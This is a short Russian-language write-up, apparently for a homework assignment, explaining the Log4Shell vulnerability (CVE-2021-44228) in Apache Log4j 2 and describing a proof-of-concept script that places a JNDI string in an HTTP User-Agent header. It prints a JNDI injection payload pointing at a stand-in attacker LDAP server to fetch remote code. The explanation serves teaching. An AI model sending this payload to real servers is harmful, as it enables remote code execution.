# Описание уязвимости CVE-2021-44228 (Log4Shell)

**Официальный источник:** [NVD - CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

### Описание
Это критическая уязвимость в популярной библиотеке **Apache Log4j 2**, которую используют тысячи Java-приложений для ведения логов (журналов событий).
Тип уязвимости: **RCE (Remote Code Execution)** — удаленное выполнение кода.

### Принцип работы
Суть проблемы в том, что библиотека слишком "умная". Если она видит в логах специальную строку (JNDI-инъекцию), она пытается её выполнить.
Атакующему достаточно отправить серверу строку вида:
`${jndi:ldap://zloy-server.com/exploit}`

Сервер запишет это в лог, увидит команду `jndi`, обратится по указанному адресу и загрузит оттуда вредоносный код.

### Что делает скрипт hw10_log4shell_poc.py?
В файле `hw10_log4shell_poc.py` безопасная демонстрация (Proof of Concept).
1. Скрипт формирует HTTP-запрос к цели.
2. В заголовок **User-Agent** вставляет ту самую строку `${jndi:...}`.
3. Отправляет запрос.

Скрипт не ломает сервер, а просто имитирует действия хакера, чтобы проверить, как формируется такой запрос.
